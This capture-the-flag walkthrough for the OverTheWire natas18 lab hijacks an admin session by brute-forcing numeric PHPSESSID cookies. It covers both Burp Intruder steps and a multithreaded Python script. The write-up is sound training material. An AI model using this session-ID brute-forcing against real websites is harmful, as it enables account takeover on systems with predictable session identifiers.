# natas18

Let's open the source code and we see, logging in as admin wont do us good since it is considered unsafe. But we also see that `PHPSESSID` is a cookie which tells us if we logged in as a regular person or admin. Well that's our first clue. We launch BurpSuite, before forwading set an attack using Intruder which checks for `PHPSESSID` from 0 to 640(max limit). <br>
This is how we do it-<br>
1. set `username=admin` and `password=anything` and submit.
2. Forward request once, the next proxy content will show us `PHPSESSID` as 237(maybe different for you).
3. Highlist 237 and send it to Intruder. 
4. In Payloads, set payload as `Numbers` from 0 to 640.
5. In Settings, set Grep match list with suitable content from source code to land a hit if PHPSESSID is correct.
6. Wait a while.

Now you get your `PHPSESSID=`(maybe different for you) which will logs us in as admin and you got your password. <br>

## Approach 2(faster)
Use python coding for the same, with multithreading. This will take almost same time for each thread( i.e. in 1 second earlier if you were getting 1 response, now you get 6)(approx 1 seconds).<br>
So the code is-
```python
import requests
import threading

def try_session_ids(start, end):
	target = 'http://natas18.natas.labs.overthewire.org'
	auth = ('natas18','<password>')
	params = dict(username='admin', password='s3cr3t')
	cookies = dict()

	for s_id in range(start, end):
		print ("Trying with PHPSESSID = " + str(s_id))
		cookies = dict(PHPSESSID=str(s_id))
		r = requests.get(target, auth=auth, params=params, cookies=cookies)
		if "You are an admin" in r.text:
			print (r.text)
			break

threads = []
for i in range(0, 601, 100):
	thread = threading.Thread(target=try_session_ids, args=(i, i+100))
	thread.start()
	threads.append(thread)

for thread in threads:
	thread.join()
```
If you don't get a response here, try from 601 to 640 and you are done. This is really fast approach to this problem.
